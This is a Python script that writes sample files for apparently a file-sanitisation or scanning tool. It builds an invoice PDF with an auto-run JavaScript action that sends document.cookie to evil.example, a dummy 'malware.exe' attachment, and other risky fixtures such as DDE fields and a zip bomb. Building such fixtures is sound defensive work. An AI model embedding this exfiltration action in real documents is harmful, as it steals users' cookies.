"""Writes realistic, inert demo files into samples/ - drag them into the UI or POST them to the API."""
import io
import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path[:0] = [ROOT, os.path.join(ROOT, "corpus")]
import make_corpus as mc
import pikepdf
from pikepdf import Dictionary, Name, String


def invoice():
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A5
    from reportlab.pdfgen import canvas
    b = io.BytesIO()
    c = canvas.Canvas(b, pagesize=A5, invariant=1)
    w, h = A5
    c.setFillColor(colors.HexColor("#1E2A2D")); c.rect(0, h - 70, w, 70, fill=1, stroke=0)
    c.setFillColor(colors.HexColor("#D7FF64")); c.rect(24, h - 52, 28, 28, fill=1, stroke=0)
    c.setFillColor(colors.white); c.setFont("Helvetica-Bold", 20); c.drawString(64, h - 46, "ACME Industrial")
    c.setFillColor(colors.black); c.setFont("Helvetica-Bold", 16); c.drawString(24, h - 110, "Invoice #2026-0417")
    c.setFont("Helvetica", 10)
    rows = [("Item", "Qty", "Price"), ("Titanium bracket", "40", "$1,200.00"), ("Calibration service", "1", "$450.00"), ("Freight", "1", "$85.00")]
    y = h - 150
    for i, r in enumerate(rows):
        c.setFont("Helvetica-Bold" if i == 0 else "Helvetica", 10)
        c.drawString(24, y, r[0]); c.drawString(210, y, r[1]); c.drawRightString(w - 24, y, r[2]); y -= 20
        c.line(24, y + 14, w - 24, y + 14)
    c.setFont("Helvetica-Bold", 14); c.drawRightString(w - 24, y - 16, "Total due: $1,735.00")
    c.setFont("Helvetica", 8); c.drawString(24, 30, "Payment terms: net 30. Thank you for your business.")
    c.save()
    pdf = pikepdf.open(io.BytesIO(b.getvalue()))
    pdf.Root.OpenAction = Dictionary(S=Name.JavaScript, JS=String("app.launchURL('http://evil.example/?c='+document.cookie)"))
    pdf.attachments["malware.exe"] = pikepdf.AttachedFileSpec(pdf, b"MZ" + b"\x90" * 300, mime_type="application/x-msdownload")
    pdf.docinfo["/Author"] = "CEO John Doe"
    pdf.docinfo["/Creator"] = "Internal Finance Suite 9"
    pdf.docinfo["/Producer"] = "FinTool PDF Engine"
    out = io.BytesIO(); pdf.save(out); return out.getvalue()


if __name__ == "__main__":
    dest = os.path.join(ROOT, "samples")
    os.makedirs(dest, exist_ok=True)
    fx = {f.name: f for f in mc.build_all(include_media=False)}
    files = {"invoice_malicious.pdf": invoice(), "vacation_photo_gps.jpg": fx["jpg_with_gps_exif"].data,
             "report_dde.docx": fx["docx_dde_fields"].data, "budget_hidden_sheet.xlsx": fx["xlsx_hidden_sheet_rows_cols"].data,
             "logo_script.svg": fx["svg_script_tag"].data, "newsletter.eml": fx["eml_tracking_script_attachments"].data,
             "bundle.zip": fx["zip_mixed_content"].data, "resume.pdf": fx["exe_renamed_pdf"].data,
             "bomb.zip": fx["zip_bomb_ratio"].data}
    for n, d in files.items():
        with open(os.path.join(dest, n), "wb") as f:
            f.write(d)
    print("wrote", len(files), "samples to", dest)
